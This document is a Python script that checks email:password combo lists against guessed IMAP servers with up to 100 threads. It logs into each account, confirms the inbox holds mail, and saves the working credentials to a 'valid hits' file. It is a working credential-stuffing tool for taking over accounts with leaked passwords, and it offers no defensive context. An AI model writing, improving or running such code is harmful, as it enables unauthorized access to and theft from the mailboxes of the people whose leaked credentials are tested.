import imaplib
import threading
import time
import sys
import os
import configparser

# Configuration
COMBO_FILE = "combo.txt" # Email:Password wordlist combo to check.
IMAP_SUBDOMAINS_FILE = "imapsubdomains.txt" # Possible IMAP addresses. The most common have been added for a great speed:discovery ratio.
VALID_HITS_FILE = "imap_valid_hits.txt" # Valid results will be here. As of now there is no capture features, I plan to add in the future.
CONFIG_FILE = "imap_config.ini" # This file auto-updates the more you run the script, and becomes faster as it gains more known servers.
TIMEOUT = 3  # seconds
MAX_THREADS = 100  # Adjust as needed
VERBOSE = "-v" in sys.argv  # Check if verbose mode is enabled
CONFIG_LOAD_INTERVAL = 30  # Reload config.ini every 30 lines.


# Load IMAP subdomains
def load_imap_subdomains():
    with open(IMAP_SUBDOMAINS_FILE, "r") as f:
        return [line.strip() for line in f if line.strip()]

IMAP_SUBDOMAINS = load_imap_subdomains()


# Load imap_config.ini
def load_config():
    config = configparser.ConfigParser()
    if os.path.exists(CONFIG_FILE):
        config.read(CONFIG_FILE)
    return config


# Save working IMAP server to imap_config.ini
def save_config(domain, imap_server):
    config = load_config()
    
    if 'IMAP' not in config:
        config['IMAP'] = {}
    
    config['IMAP'][domain] = imap_server
    
    with open(CONFIG_FILE, "w") as configfile:
        config.write(configfile)
    
    if VERBOSE:
        print(f"[DEBUG] Added {domain}: {imap_server} to {CONFIG_FILE}")


# Get IMAP servers, checking config.ini first
def get_imap_servers(email, config):
    domain = email.split("@")[-1]
    
    # If a working IMAP server is already known, return only that
    if 'IMAP' in config and domain in config['IMAP']:
        return [config['IMAP'][domain]]

    # Otherwise, generate from subdomains list
    return [f"{sub}{domain}" if sub.endswith(".") else f"{sub}.{domain}" for sub in IMAP_SUBDOMAINS]


# Check email credentials
def check_email(email, password, config):
    domain = email.split("@")[-1]
    imap_servers = get_imap_servers(email, config)

    for imap_server in imap_servers:
        mail = None
        try:
            mail = imaplib.IMAP4_SSL(imap_server, timeout=TIMEOUT)
            mail.login(email, password)
            mail.select("INBOX")
            _, data = mail.search(None, "ALL")

            if data[0]:  # Check if there are any emails
                emails = data[0].split()
                if len(emails) > 1:
                    with open(VALID_HITS_FILE, "a") as f:
                        f.write(f"{email}:{password}\n")
                    print(f"[+] Valid: {email}")  # Always print valid hits
                    
                    # Save working IMAP server to config
                    save_config(domain, imap_server)
                    return  # Stop checking other subdomains once successful

        except Exception as e:
            if VERBOSE:
                print(f"[!] Failed: {email} ({imap_server}) - {e}")

        finally:
            if mail:
                try:
                    mail.logout()
                except Exception:
                    pass  # Ignore logout errors

    if VERBOSE:
        print(f"[-] Invalid: {email}")  # Only print invalid attempts in verbose mode


# Load combos and start threads
def main():
    threads = []
    config = load_config()  # Initial config load
    lines_processed = 0

    with open(COMBO_FILE, "r") as f:
        for line in f:
            parts = line.strip().split(":")
            if len(parts) == 2:
                email, password = parts

                # Reload config every 50 lines
                if lines_processed % CONFIG_LOAD_INTERVAL == 0:
                    config = load_config()
                
                while threading.active_count() > MAX_THREADS:
                    time.sleep(1)  # Wait to avoid excessive threading

                thread = threading.Thread(target=check_email, args=(email, password, config))
                thread.start()
                threads.append(thread)
                lines_processed += 1

    # Wait for all threads to finish
    for thread in threads:
        thread.join()


if __name__ == "__main__":
    main()
